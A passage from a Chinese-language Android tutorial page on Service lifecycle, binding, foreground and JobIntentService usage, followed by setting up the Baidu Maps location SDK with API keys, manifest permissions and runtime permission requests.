startId)</span> </span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onStartCommand executed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onDestroy executed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>onCreate()</code> 方法会在服务创建的时候调用</li>
<li><code>onStartCommand()</code> 方法会在每次服务启动的时候调用</li>
<li><code>onDestroy()</code> 方法会在服务销毁的时候调用</li>
</ul>
<h4 id="启动和停止服务">启动和停止服务<a class="header-anchor" href="#启动和停止服务"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">        <span class="keyword">case</span> R.id.start_service:</span><br><span class="line">            Intent startIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService.class);</span><br><span class="line">            startService(startIntent); <span class="comment">// 启动服务</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.stop_service:</span><br><span class="line">            Intent stopIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService.class);</span><br><span class="line">            stopService(stopIntent); <span class="comment">// 停止服务</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>服务自行运行完毕停止：在服务类中根据需要调用<code>stopSelf()</code>方法</p>
<h4 id="活动和服务绑定">活动和服务绑定<a class="header-anchor" href="#活动和服务绑定"> ¶ </a></h4>
<p>创建一个专门的Binder 对象来对下载功能进行管理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> DownloadBinder mBinder = <span class="keyword">new</span> DownloadBinder();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DownloadBinder</span> <span class="keyword">extends</span> <span class="title">Binder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDownload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;startDownload executed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getProgress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;getProgress executed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mBinder;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当一个活动和服务绑定了之后，就可以调用该服务里的Binder 提供的方法了</p>
<p><strong>活动</strong>创建了一个<code>ServiceConnection</code> 的匿名类，在里面重写了<code>onServiceConnected()</code>方法和<code>onServiceDisconnected()</code> 方法，这两个方法分别会在<em>活动与服务成功绑定</em>以及<em>活动与服务的连接断开</em>的时候调用</p>
<p>构建出了一个Intent 对象，然后调用bindService() 方法将MainActivity和MyService进行绑定。</p>
<p>bindService() 方法接收3个参数：</p>
<ul>
<li>第一个参数就是刚刚构建出的Intent 对象</li>
<li>第二个参数是前面创建出的ServiceConnection的实例</li>
<li>第三个参数则是一个标志位，这里传<code>入BIND_AUTO_CREATE</code> 表示在活动和服务进行绑定后自动创建服务。这会使得MyService中的onCreate() 方法得到执行，<strong>但onStartCommand() 方法不会执行</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MyService.DownloadBinder downloadBinder;</span><br><span class="line">    <span class="keyword">private</span> ServiceConnection connection = <span class="keyword">new</span> ServiceConnection() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceDisconnected</span><span class="params">(ComponentName name)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 非正常情况下服务被终止执行</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 绑定服务成功以后执行</span></span><br><span class="line">            downloadBinder = (MyService.DownloadBinder) service;</span><br><span class="line">            downloadBinder.startDownload();</span><br><span class="line">            downloadBinder.getProgress();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        Button bindService = (Button) findViewById(R.id.bind_service);</span><br><span class="line">        Button unbindService = (Button) findViewById(R.id.unbind_service);</span><br><span class="line">        bindService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        unbindService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">case</span> R.id.bind_service:</span><br><span class="line">                Intent bindIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService.class);</span><br><span class="line">                bindService(bindIntent, connection, BIND_AUTO_CREATE); <span class="comment">// 绑定服务</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.unbind_service:</span><br><span class="line">                unbindService(connection); <span class="comment">// 解绑服务</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="服务Service的生命周期">服务Service的生命周期<a class="header-anchor" href="#服务Service的生命周期"> ¶ </a></h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//Service%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="img"></p>
<p>一旦在项目的任何位置调用了Context的startService() 方法，相应的服务就会启动起来，并回调onStartCommand() 方法。</p>
<p>如果这个服务之前还没有创建过，onCreate() 方法会先于onStartCommand() 方法执行。服务启动了之后会一直保持运行状态，直到stopService()或stopSelf() 方法被调用。</p>
<p>注意，虽然每调用一次startService() 方法，onStartCommand() 就会执行一次，但实际上<strong>每个服务都只会存在一个实例</strong>。所以不管你调用了多少次startService()方法，只需调用一次stopService() 或stopSelf()方法，服务就会停止下来了。</p>
<p>另外，还可以调用Context的bindService() 来获取一个服务的持久连接，这时就会回调服务中的onBind() 方法。</p>
<p>类似地，如果这个服务之前还没有创建过，onCreate() 方法会先于onBind() 方法执行。之后，调用方可以获取到onBind() 方法里返回的IBinder 对象的实例，这样就能自由地和服务进行通信了。只要调用方和服务之间的连接没有断开，服务就会一直保持运行状态。<br>
当调用了startService() 方法后，又去调用stopService() 方法，这时服务中的onDestroy()方法就会执行，表示服务已经销毁了。类似地，当调用了bindService() 方法后，又去调用unbindService() 方法，onDestroy() 方法也会执行，这两种情况都很好理解。</p>
<p>但是需要注意，我们是完全有可能对一个服务既调用了startService() 方法，又调用了bindService() 方法的，这种情况下该如何才能让服务销毁掉呢？根据Android系统的机制，一个服务只要被启动或者被绑定了之后，就会一直处于运行状态，必须要让以上两种条件同时不满足，服务才能被销毁。所以，这种情况下要同时调用stopService()和unbindService() 方法，onDestroy() 方法才会执行。</p>
<h3 id="服务的更多技巧">服务的更多技巧<a class="header-anchor" href="#服务的更多技巧"> ¶ </a></h3>
<h3 id="使用前台服务">使用前台服务<a class="header-anchor" href="#使用前台服务"> ¶ </a></h3>
<p>只是创建通知后，调用<code>startForeground()</code>对象来显示前台服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onCreate executed&quot;</span>);</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MainActivity.class);</span><br><span class="line">        PendingIntent pi = PendingIntent.getActivity(<span class="keyword">this</span>, <span class="number">0</span>, intent, <span class="number">0</span>);</span><br><span class="line">        Notification notification = <span class="keyword">new</span> NotificationCompat.Builder(<span class="keyword">this</span>)</span><br><span class="line">                .setContentTitle(<span class="string">&quot;This is content title&quot;</span>)</span><br><span class="line">                .setContentText(<span class="string">&quot;This is content text&quot;</span>)</span><br><span class="line">                .setWhen(System.currentTimeMillis())</span><br><span class="line">                .setSmallIcon(R.mipmap.ic_launcher)</span><br><span class="line">                .setLargeIcon(BitmapFactory.decodeResource(getResources(),</span><br><span class="line">                    R.mipmap.ic_launcher))</span><br><span class="line">                .setContentIntent(pi)</span><br><span class="line">                .build();</span><br><span class="line">        startForeground(<span class="number">1</span>, notification);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用IntentService">使用IntentService<a class="header-anchor" href="#使用IntentService"> ¶ </a></h4>
<p>应该在服务的每个具体的方法里开启一个子线程，然后在这里去处理那些耗时的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 处理具体的逻辑</span></span><br><span class="line">                stopSelf();	<span class="comment">// 在子线程中添加该语句，可让服务执行完后自行停止</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者简单的 继承<code>IntentService</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyIntentService</span> <span class="keyword">extends</span> <span class="title">IntentService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyIntentService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="string">&quot;MyIntentService&quot;</span>); <span class="comment">// 调用父类的有参构造函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onHandleIntent</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 在当前方法中处理耗时逻辑</span></span><br><span class="line">        <span class="comment">// 打印当前线程的id</span></span><br><span class="line">        Log.d(<span class="string">&quot;MyIntentService&quot;</span>, <span class="string">&quot;Thread id is &quot;</span> + Thread.currentThread(). getId());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(<span class="string">&quot;MyIntentService&quot;</span>, <span class="string">&quot;onDestroy executed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要在子类中去实现<code>onHandleIntent()</code> 这个抽象方法，在这个方法中可以去处理一些具体的逻辑，而且不用担心ANR的问题，因为这个方法已经是在子线程中运行的了。另外根据ntentService 的特性，<strong>这个服务在运行结束后应该是会自动停止</strong>的，所以我们又重写了<code>onDestroy()</code> 方法，在这里也打印了一行日志，以证实服务是不是停止掉了</p>
<h4 id="使用JobService">使用JobService<a class="header-anchor" href="#使用JobService"> ¶ </a></h4>
<p>Android8.0(26)之后推荐使用JobService</p>
<p>重写方法变为<code>onHandleWork()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyJobIntentService</span> <span class="keyword">extends</span> <span class="title">JobIntentService</span> </span>&#123;</span><br><span class="line">    <span class="comment">// JobIntentService会使用单独的线程来执行该方法的代码</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onHandleWork</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 该方法内可以执行任何耗时任务，比如下载文件等，此处只是让线程暂停20秒</span></span><br><span class="line">        <span class="keyword">long</span> endTime = System.currentTimeMillis() + <span class="number">20</span> * <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">while</span> (System.currentTimeMillis() &lt; endTime) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">	         <span class="keyword">try</span> &#123;</span><br><span class="line">	             wait(endTime - System.currentTimeMillis());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 耗时任务执行完成</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>AndroidManifest.xml中配置Service</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">&quot;.MyJobIntentService&quot;</span> <span class="attr">android:permission</span>=<span class="string">&quot;android.permission.BIND_JOB_SERVICE&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--android.permission.BIND_JOB_SERVICE这个权限一定要有，否则程序会崩溃--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>启动服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">    <span class="keyword">int</span> JOB_ID = <span class="number">88</span>;</span><br><span class="line">    Intent work  = <span class="keyword">new</span> Intent();</span><br><span class="line">    work.putExtra(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    MyJobIntentService.enqueueWork(MainActivity.<span class="keyword">this</span>,</span><br><span class="line">        MyJobIntentService.class,JOB_ID, work);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="服务的最佳实践——完整版的下载示例">服务的最佳实践——完整版的下载示例<a class="header-anchor" href="#服务的最佳实践——完整版的下载示例"> ¶ </a></h3>
<p>@TODO</p>
<h2 id="基于位置的服务">基于位置的服务<a class="header-anchor" href="#基于位置的服务"> ¶ </a></h2>
<h3 id="百度地图API">百度地图API<a class="header-anchor" href="#百度地图API"> ¶ </a></h3>
<h4 id="申请API">申请API<a class="header-anchor" href="#申请API"> ¶ </a></h4>
<p>前往<a href="http://developer.baidu.com/user/reg">百度开放服务平台 (baidu.com)</a>注册开发者</p>
<p>来到<a href="https://lbsyun.baidu.com/apiconsole/key">控制台 | 百度地图开放平台 (baidu.com)</a>创建应用</p>
<p>应用名称随意，应用类型选择【Android SDK】</p>
<h5 id="获取开发版-debug-SHA1">获取开发版(debug) SHA1<a class="header-anchor" href="#获取开发版-debug-SHA1"> ¶ </a></h5>
<p>前往系统的<code>.android</code>目录，默认位于<code>~/.android</code></p>
<p>输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">E:\code\Android\.android&gt;keytool -list -v -keystore debug.keystore</span><br><span class="line">输入密钥库口令:</span><br><span class="line">密钥库类型: jks</span><br><span class="line">密钥库提供方: SUN</span><br><span class="line"></span><br><span class="line">您的密钥库包含 1 个条目</span><br><span class="line"></span><br><span class="line">别名: androiddebugkey</span><br><span class="line">创建日期: 2021-2-27</span><br><span class="line">条目类型: PrivateKeyEntry</span><br><span class="line">证书链长度: 1</span><br><span class="line">证书[1]:</span><br><span class="line">所有者: C=US, O=Android, CN=Android Debug</span><br><span class="line">发布者: C=US, O=Android, CN=Android Debug</span><br><span class="line">序列号: 1</span><br><span class="line">有效期为 Sat Feb 27 18:40:11 CST 2021 至 Mon Feb 20 18:40:11 CST 2051</span><br><span class="line">证书指纹:</span><br><span class="line">         MD5:  84:9D:C6:94:D8:2F:C2:90:00:00:00:00:00:00:00:00</span><br><span class="line">         SHA1: D2:4C:7C:89:85:83:9A:68:1C:6F:FF:0F:00:00:00:00:00:00:00:00</span><br><span class="line">         SHA256: EF:5A:67:E6:15:68:64:05:AD:95:90:7F:0F:5C:34:2B:79:54:15:C0:85:94:1E:9B:00:00:00:00:00:00:00:00</span><br><span class="line">签名算法名称: SHA1withRSA</span><br><span class="line">主体公共密钥算法: 2048 位 RSA 密钥</span><br><span class="line">版本: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*******************************************</span><br><span class="line">*******************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning:</span><br><span class="line">JKS 密钥库使用专用格式。建议使用 <span class="string">&quot;keytool -importkeystore -srckeystore debug.keystore -destkeystore debug.keystore -deststoretype pkcs12&quot;</span> 迁移到行业标准格式 PKCS12。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="获取发布板-release-SHA1">获取发布板(release) SHA1<a class="header-anchor" href="#获取发布板-release-SHA1"> ¶ </a></h5>
<p><a href="https://www.cnblogs.com/zhangmiao14/p/7274977.html">Android百度地图开发-第一篇：申请、搭建百度地图 - zhangmiao14 - 博客园 (cnblogs.com)</a>创建相应的签名文件，并获取相应的SHA1</p>
<p>(测试，可以相同)</p>
<h5 id="包名正常设置">包名正常设置<a class="header-anchor" href="#包名正常设置"> ¶ </a></h5>
<h5 id="点击提交">点击提交<a class="header-anchor" href="#点击提交"> ¶ </a></h5>
<h5 id="可复制key，或者-设置-修改上述配置">可复制key，或者[设置]修改上述配置<a class="header-anchor" href="#可复制key，或者-设置-修改上述配置"> ¶ </a></h5>
<h3 id="使用百度定位">使用百度定位<a class="header-anchor" href="#使用百度定位"> ¶ </a></h3>
<p>官方开发文档：<a href="https://lbs.baidu.com/index.php?title=androidsdk">Android地图SDK | 百度地图API SDK (baidu.com)</a></p>
<h5 id="下载-配置SDK">下载&amp;配置SDK<a class="header-anchor" href="#下载-配置SDK"> ¶ </a></h5>
<h6 id="下载SDK">下载SDK<a class="header-anchor" href="#下载SDK"> ¶ </a></h6>
<p><a href="https://lbs.baidu.com/index.php?title=sdk/download&amp;action#selected=mapsdk_basicmap,mapsdk_searchfunction,mapsdk_lbscloudsearch,mapsdk_calculationtool,mapsdk_radar">SDK下载 - 百度LBS开放平台 (baidu.com)</a></p>
<p>（根据需要）选择基础定位和基础地图，选择jar格式、标准开发包选择下载</p>
<h6 id="配置SDK">配置SDK<a class="header-anchor" href="#配置SDK"> ¶ </a></h6>
<p>解压下载的jar包，然后进入<code>libs</code>目录</p>
<p>选择其中的<code>BaiduLBS_Android.jar</code>文件放入项目中<code>app/libs</code>目录</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gradle中需配置</span></span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line">    <span class="function">implementation <span class="title">fileTree</span><span class="params">(dir: <span class="string">&#x27;libs&#x27;</span>, include: [<span class="string">&#x27;*.jar&#x27;</span>])</span></span></span><br><span class="line"><span class="function">    ...</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure>
<p>之后新建<code>src/main/jniLibs</code>目录，将 剩余所有 复制到此处</p>
<h5 id="项目配置">项目配置<a class="header-anchor" href="#项目配置"> ¶ </a></h5>
<h6 id="AndroidManifest配置">AndroidManifest配置<a class="header-anchor" href="#AndroidManifest配置"> ¶ </a></h6>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.example.lbstest&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 添加权限：start --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_COARSE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_FINE_LOCATION&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CHANGE_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_PHONE_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 可删去 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WAKE_LOCK&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 添加权限：end --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 添加key：start 需要修改value为申请到的key值 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span>  </span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;com.baidu.lbsapi.API_KEY&quot;</span>  </span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;开发者 key&quot;</span> /&gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- 添加key：end --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="代码">代码<a class="header-anchor" href="#代码"> ¶ </a></h5>
<p><a name="runtime_permission">动态申请权限代码示例</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> LocationClient mLocationClient;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TextView positionText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        mLocationClient = <span class="keyword">new</span> LocationClient(getApplicationContext());</span><br><span class="line">        <span class="comment">// 注册一个定位监听器，当获得位置时，就会回调该监听器</span></span><br><span class="line">        mLocationClient.registerLocationListener(<span class="keyword">new</span> MyLocationListener());</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        positionText = (TextView) findViewById(R.id.position_text_view);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//动态申请权限</span></span><br><span class="line">        <span class="comment">// 申请权限较多，建立权限数组</span></span><br><span class="line">        List&lt;String&gt; permissionList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="comment">// 如果没有该权限，就将该权限添加到权限数组中</span></span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">            permission.ACCESS_FINE_LOCATION)!= PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            permissionList.add(Manifest.permission.ACCESS_FINE_LOCATION);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.</span><br><span class="line">            permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">            